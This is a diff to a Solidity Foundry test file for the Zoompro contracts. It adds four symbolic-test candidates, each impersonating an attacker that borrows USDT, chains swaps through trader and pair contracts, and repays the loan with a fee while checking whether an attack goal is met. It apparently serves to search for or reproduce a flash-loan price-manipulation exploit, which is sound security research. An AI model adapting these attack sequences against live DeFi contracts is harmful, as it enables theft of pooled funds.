@@ -353,6 +353,85 @@ contract ZoomproTest is Test, BlockLoader {
         trader.sell(amount);
     }
 
+    function check_cand000(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt5 >= (amt0 * 1003) / 1000);
+        borrow_usdt_owner(amt0);
+        swap_trader_attacker_usdt_zoom(amt1, amt2);
+        swap_trader_attacker_zoom_usdt(amt3, amt4);
+        payback_usdt_owner(amt5);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand001(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt7 >= (amt0 * 1003) / 1000);
+        borrow_usdt_owner(amt0);
+        swap_trader_attacker_usdt_zoom(amt1, amt2);
+        swap_pair_attacker_fusdt_zoom(amt3, amt4);
+        swap_trader_attacker_zoom_usdt(amt5, amt6);
+        payback_usdt_owner(amt7);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand002(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt7 >= (amt0 * 1003) / 1000);
+        borrow_usdt_owner(amt0);
+        swap_trader_attacker_usdt_zoom(amt1, amt2);
+        swap_pair_attacker_zoom_fusdt(amt3, amt4);
+        swap_trader_attacker_zoom_usdt(amt5, amt6);
+        payback_usdt_owner(amt7);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand003(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt5 >= (amt0 * 1003) / 1000);
+        borrow_usdt_owner(amt0);
+        swap_trader_attacker_usdt_zoom(amt1, amt2);
+        addliquidity_controller_pair_fusdt_fusdt();
+        swap_trader_attacker_zoom_usdt(amt3, amt4);
+        payback_usdt_owner(amt5);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
     function test_gt() public {
         vm.startPrank(attacker);
         borrow_usdt_owner(3000000e18);
